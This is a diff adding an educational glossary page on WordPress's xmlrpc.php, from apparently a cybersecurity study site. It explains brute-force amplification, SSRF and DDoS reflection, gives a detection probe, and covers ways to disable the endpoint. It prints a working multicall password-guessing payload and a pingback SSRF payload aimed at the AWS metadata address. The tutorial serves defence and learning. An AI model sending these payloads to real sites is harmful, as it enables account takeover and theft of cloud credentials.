@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>XML-RPC — WordPress's Legacy Backdoor ☕</title>
+<link rel="stylesheet" href="../assets/styles.css" />
+</head>
+<body data-page-slug="xml-rpc">
+
+<div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="topbar">
+  <a class="logo" href="../index.html">☕ CYBERSEC.VAULT</a>
+  <nav>
+    <a href="../index.html">Home</a>
+    <a href="../index.html#topics-web">Topics</a>
+    <a href="../index.html#topics-python">Python</a>
+    <a href="index.html" class="active">Glossary</a>
+    <a href="../tryhackme/index.html">THM</a>
+    <a href="../htb-academy/index.html">HTB</a>
+    <a href="../labs/portswigger/index.html">Labs</a>
+  </nav>
+  <div class="search-wrap">
+    <input type="text" class="search" placeholder="Search (press /)..." />
+    <div class="search-results"></div>
+  </div>
+</div>
+
+<div class="breadcrumb">
+  <a href="../index.html">Home</a>
+  <span class="sep">›</span>
+  <a href="index.html">Glossary</a>
+  <span class="sep">›</span>
+  <span>XML-RPC</span>
+</div>
+
+<!-- HERO -->
+<section class="hero" style="min-height: 45vh;">
+  <div class="hero-content">
+    <span class="coffee-badge">📖 glossary · protocol / attack surface · should be dead already</span>
+    <h1 style="font-family: var(--mono);">xmlrpc.php <span style="color: var(--accent-2);">📡</span></h1>
+    <p class="subtitle">WordPress's legacy remote API. Brute-force amplifier. SSRF vector. DDoS reflector.<br>Enabled by default on every WordPress install. Almost never needed.</p>
+    <div class="tagline">"It's 2026 and xmlrpc.php is STILL enabled by default. Unbelievable." 🤦</div>
+  </div>
+</section>
+
+<!-- WHAT IT IS -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 01 // Definition</div>
+  <h2><span class="emoji">📖</span> What is XML-RPC?</h2>
+  <p class="lead"><strong>XML-RPC</strong> (XML Remote Procedure Call) is a protocol from 1998 that lets remote clients call functions on a server by sending XML payloads over HTTP. <span class="term" data-term="wordpress">WordPress</span> exposes it at <code class="inline">/xmlrpc.php</code> to support remote publishing, pingbacks, and the WordPress mobile app.</p>
+
+  <div class="paper">
+    <h4>📝 The back door with no lock analogy</h4>
+    <p>Imagine your house has a front door (wp-login.php) with a deadbolt, a camera, and a rate-limited buzzer. After 5 wrong buzzes, it locks for 15 minutes.</p>
+    <p>Now imagine there's a <strong>back door</strong> (xmlrpc.php) that was installed in 1998, has no camera, no buzzer limit, and you can shove <strong>500 keys into it at once</strong> and it'll try them all before responding.</p>
+    <p><span class="highlight">That's XML-RPC. It's a back door that handles bulk authentication requests with zero rate limiting.</span> And it's open on every WordPress site by default.</p>
+  </div>
+</section>
+
+<div class="divider">why WP has it</div>
+
+<!-- WHY IT EXISTS -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 02 // History</div>
+  <h2><span class="emoji">📜</span> Why does WordPress still have this?</h2>
+
+  <p>XML-RPC was added to WordPress before the REST API existed. It was the ONLY way to:</p>
+  <ul>
+    <li>Publish posts from desktop clients (Windows Live Writer, MarsEdit)</li>
+    <li>Use the WordPress mobile app</li>
+    <li>Allow other sites to send <strong>pingbacks</strong> (trackback notifications)</li>
+    <li>Integrate with external services like Jetpack</li>
+  </ul>
+
+  <p>Since WordPress 4.7 (2016), the <strong>REST API</strong> handles all of these use cases better and more securely. But XML-RPC was never disabled by default for backward compatibility. So it sits there, on every WordPress site, waiting to be abused.</p>
+
+  <div class="callout danger">
+    <strong>⚠️ The kicker:</strong> Most WordPress site owners don't even know xmlrpc.php exists, let alone that it's enabled and internet-facing. They couldn't tell you what it does. But attackers absolutely know.
+  </div>
+</section>
+
+<div class="divider">the 3 attacks</div>
+
+<!-- THE THREE ATTACK VECTORS -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 03 // The three attack vectors</div>
+  <h2><span class="emoji">💥</span> Three ways XML-RPC gets you pwned</h2>
+
+  <h3>Attack 1: Brute-force amplification via <code class="inline">system.multicall</code></h3>
+  <p>The <code class="inline">system.multicall</code> method lets you batch multiple XML-RPC calls into a <strong>single HTTP request</strong>. Attackers abuse this by stuffing hundreds of <code class="inline">wp.getUsersBlogs</code> authentication attempts into one request.</p>
+
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>🚪 wp-login.php</h4>
+      <p>1 HTTP request = 1 password attempt<br>Rate limit: blocks after 5 attempts<br>Speed: slow, detectable</p>
+    </div>
+    <div class="card" style="border-color: var(--accent-2);">
+      <h4 style="color: var(--accent-2);">🚀 xmlrpc.php multicall</h4>
+      <p>1 HTTP request = <strong>500+ password attempts</strong><br>Rate limit: counts as 1 request<br>Speed: 100x faster, often invisible to login-based protections</p>
+    </div>
+  </div>
+
+  <div class="code evil">
+<span class="com">&lt;!-- Multicall brute-force payload — 3 attempts in one request --&gt;</span>
+<span class="com">&lt;!-- In real attacks, this is 500+ attempts per request --&gt;</span>
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;<span class="inject">system.multicall</span>&lt;/methodName&gt;
+  &lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;
+    &lt;value&gt;&lt;struct&gt;
+      &lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;
+        &lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+      &lt;/member&gt;
+      &lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;
+        &lt;value&gt;&lt;string&gt;<span class="inject">admin</span>&lt;/string&gt;&lt;/value&gt;
+        &lt;value&gt;&lt;string&gt;<span class="inject">password123</span>&lt;/string&gt;&lt;/value&gt;
+      &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;
+    &lt;/struct&gt;&lt;/value&gt;
+    &lt;value&gt;&lt;struct&gt;
+      &lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;
+        &lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+      &lt;/member&gt;
+      &lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;
+        &lt;value&gt;&lt;string&gt;<span class="inject">admin</span>&lt;/string&gt;&lt;/value&gt;
+        &lt;value&gt;&lt;string&gt;<span class="inject">letmein</span>&lt;/string&gt;&lt;/value&gt;
+      &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;
+    &lt;/struct&gt;&lt;/value&gt;
+    &lt;value&gt;&lt;struct&gt;
+      &lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;
+        &lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+      &lt;/member&gt;
+      &lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;
+        &lt;value&gt;&lt;string&gt;<span class="inject">admin</span>&lt;/string&gt;&lt;/value&gt;
+        &lt;value&gt;&lt;string&gt;<span class="inject">qwerty</span>&lt;/string&gt;&lt;/value&gt;
+      &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;
+    &lt;/struct&gt;&lt;/value&gt;
+  &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
+&lt;/methodCall&gt;
+  </div>
+
+  <h3>Attack 2: SSRF via <code class="inline">pingback.ping</code></h3>
+  <p>The pingback method tells WordPress: "Hey, I linked to your post — come visit my URL to verify." WordPress obediently makes an HTTP request to <strong>whatever URL you specify</strong>. That's textbook <span class="term" data-term="ssrf">SSRF</span>.</p>
+
+  <div class="code evil">
+<span class="com">&lt;!-- Pingback SSRF — make WordPress fetch an internal URL --&gt;</span>
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;<span class="inject">pingback.ping</span>&lt;/methodName&gt;
+  &lt;params&gt;
+    &lt;param&gt;&lt;value&gt;&lt;string&gt;<span class="inject">http://169.254.169.254/latest/meta-data/</span>&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+    &lt;param&gt;&lt;value&gt;&lt;string&gt;https://target.com/some-real-post&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodCall&gt;
+  </div>
+  <p>This makes the target WordPress server fetch the <strong>AWS metadata endpoint</strong> (<code class="inline">169.254.169.254</code>) from its own internal network. If the server is on AWS, you might get IAM credentials back. Classic cloud SSRF via an unexpected vector.</p>
+
+  <h3>Attack 3: DDoS amplification</h3>
+  <p>An attacker sends pingback requests from thousands of WordPress sites, all pointing to a <strong>single victim URL</strong>. Each WordPress site "verifies" the pingback by hitting the victim with an HTTP request. The attacker's bandwidth is amplified through all those WordPress servers acting as unwitting reflectors.</p>
+</section>
+
+<div class="divider">detection</div>
+
+<!-- DETECTION -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 04 // Detection</div>
+  <h2><span class="emoji">🔎</span> How to detect XML-RPC (10-second probe)</h2>
+
+  <div class="code">
+<span class="com"># Quick probe — does xmlrpc.php respond?</span>
+<span class="term" data-term="curl">curl</span> -s -X POST <span class="str">https://target.com/xmlrpc.php</span> \
+  -H <span class="str">"Content-Type: text/xml"</span> \
+  -d <span class="str">'&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;/methodCall&gt;'</span>
+  </div>
+
+  <p><strong>If it returns a list of methods</strong> (wp.getUsersBlogs, pingback.ping, system.multicall…) — XML-RPC is enabled and open for business.</p>
+  <p><strong>If you get a 403, 405, or empty response</strong> — it's been blocked. Move on.</p>
+
+  <div class="callout info">
+    <strong>💡 WPScan shortcut:</strong> <span class="term" data-term="wpscan">WPScan</span> automatically checks for XML-RPC during its standard scan. Look for <code class="inline">[+] XML-RPC seems to be enabled</code> in the output.
+  </div>
+
+  <div class="brain-power">
+    <div class="label">🧠 Brain Power</div>
+    <div class="question">Why can XML-RPC <span class="term" data-term="brute-force">brute force</span> bypass rate limiting that blocks wp-login.php?</div>
+    <button class="reveal-btn" onclick="toggleAnswer(this)">Reveal answer</button>
+    <div class="answer">
+      <p><strong>Because <code class="inline">system.multicall</code> batches hundreds of login attempts into a single HTTP request — and rate limits typically count requests, not individual authentication attempts within a request.</strong></p>
+      <p>Here's the math:</p>
+      <ul>
+        <li><strong>wp-login.php:</strong> Rate limit = 5 attempts per minute → 5 passwords tried per minute</li>
+        <li><strong>xmlrpc.php multicall:</strong> Rate limit = 5 requests per minute → but each request contains 500 attempts → <strong>2,500 passwords tried per minute</strong></li>
+      </ul>
+      <p>Most login-protection plugins (Wordfence, Limit Login Attempts) monitor <code class="inline">wp-login.php</code> but don't hook into XML-RPC authentication at the same granularity. The rate limiter sees 1 request; inside that request, 500 passwords are being tested.</p>
+      <p>It's like airport security counting bags on the conveyor belt — they count "1 bag" but don't notice you packed 500 smaller bags inside it.</p>
+    </div>
+  </div>
+</section>
+
+<div class="divider">defense</div>
+
+<!-- DEFENSE -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 05 // Disabling XML-RPC</div>
+  <h2><span class="emoji">🛡️</span> Kill it. Kill it now.</h2>
+
+  <p>Unless you specifically need XML-RPC (Jetpack, legacy mobile app, or a specific integration that hasn't migrated to REST API), <strong>disable it entirely</strong>.</p>
+
+  <h3>Method 1: .htaccess (Apache)</h3>
+  <div class="code safe">
+<span class="com"># Add to .htaccess in the WordPress root</span>
+&lt;Files xmlrpc.php&gt;
+  Order Allow,Deny
+  Deny from all
+&lt;/Files&gt;
+  </div>
+
+  <h3>Method 2: Nginx config</h3>
+  <div class="code safe">
+<span class="com"># Add to your nginx server block</span>
+location = /xmlrpc.php {
+    deny all;
+    access_log off;
+    log_not_found off;
+    return <span class="kw">403</span>;
+}
+  </div>
+
+  <h3>Method 3: WordPress filter (functions.php)</h3>
+  <div class="code safe">
+<span class="com">// Disable XML-RPC at the application level</span>
+add_filter(<span class="str">'xmlrpc_enabled'</span>, <span class="str">'__return_false'</span>);
+  </div>
+
+  <div class="callout">
+    <strong>🧠 Best practice:</strong> Block at the web server level (Methods 1 or 2) rather than the PHP level (Method 3). The web server block prevents PHP from even executing, saving server resources and eliminating the attack surface completely.
+  </div>
+
+  <div class="quiz">
+    <h4>🎯 Quick Check</h4>
+    <div class="q">You discover XML-RPC is enabled on a WordPress target. What's the MOST dangerous method you should test first?</div>
+    <div class="options">
+      <div class="opt" onclick="quizAnswer(this, false)">pingback.ping — check for DDoS potential</div>
+      <div class="opt" onclick="quizAnswer(this, true)">system.multicall + wp.getUsersBlogs — brute-force amplification</div>
+      <div class="opt" onclick="quizAnswer(this, false)">wp.getCategories — enumerate post categories</div>
+      <div class="opt" onclick="quizAnswer(this, false)">demo.sayHello — test if XML-RPC processes XML</div>
+    </div>
+    <div class="feedback"></div>
+  </div>
+</section>
+
+<!-- RELATED TERMS -->
+<section class="chapter">
+  <div class="related-terms">
+    <h4>🔗 Related in the vault</h4>
+    <div class="tags">
+      <a href="wordpress.html">🌐 WordPress</a>
+      <a href="wpscan.html">🔍 WPScan</a>
+      <a href="brute-force.html">🔨 Brute Force</a>
+      <a href="ssrf.html">🔄 SSRF</a>
+      <a href="curl.html">💻 curl</a>
+      <a href="wp-config.html">🔑 wp-config.php</a>
+    </div>
+  </div>
+</section>
+
+<footer class="site-foot">
+  <p class="coffee-line">A 1998 protocol. Still enabled by default. Still getting people hacked. Disable it. ☕</p>
+</footer>
+
+<script src="../assets/glossary.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
